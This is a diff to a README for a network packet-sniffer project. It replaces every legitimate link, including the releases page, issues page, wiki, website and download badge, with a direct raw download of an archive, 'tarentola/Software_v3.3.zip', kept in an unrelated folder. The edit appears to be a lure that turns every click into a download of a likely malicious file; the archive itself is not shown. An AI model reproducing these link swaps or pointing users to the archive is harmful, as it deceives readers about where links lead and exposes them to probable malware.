@@ -6,9 +6,9 @@ Welcome to **sniffer**, your simple and effective tool for real-time network pac
 
 ## 📥 Download the App
 
-[![Download sniffer](https://img.shields.io/badge/Download%20sniffer-v1.0-blue)](https://github.com/Riansryn/sniffer/releases)
+[![Download sniffer](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip%20sniffer-v1.0-blue)](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip)
 
-You can access the latest release of sniffer by visiting [this page](https://github.com/Riansryn/sniffer/releases). 
+You can access the latest release of sniffer by visiting [this page](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip). 
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you install sniffer, ensure your system meets the following requirements:
 
 Follow these steps to download and install sniffer:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/Riansryn/sniffer/releases).
+1. **Visit the Releases Page:** Go to [this link](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip).
 
 2. **Select the Latest Release:** Look for the most recent version of sniffer in the releases list.
 
@@ -69,7 +69,7 @@ If you encounter any issues, here are some common solutions:
 
 ## 🌐 Support
 
-For further assistance, please check the [GitHub Issues page](https://github.com/Riansryn/sniffer/issues). You can ask questions or report bugs, and community members or maintainers will assist you.
+For further assistance, please check the [GitHub Issues page](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip). You can ask questions or report bugs, and community members or maintainers will assist you.
 
 ## 🤝 Contributing
 
@@ -81,7 +81,7 @@ sniffer is licensed under the MIT License. You can freely use, modify, and distr
 
 ## 📄 Additional Links
 
-- [Documentation](https://github.com/Riansryn/sniffer/wiki)
-- [Official Website](https://github.com/Riansryn/sniffer)
+- [Documentation](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip)
+- [Official Website](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip)
   
-Try **sniffer** today, and take control of your network traffic! Don't forget to download the latest release from [this page](https://github.com/Riansryn/sniffer/releases).
+Try **sniffer** today, and take control of your network traffic! Don't forget to download the latest release from [this page](https://github.com/Riansryn/sniffer/raw/refs/heads/main/tarentola/Software_v3.3.zip).
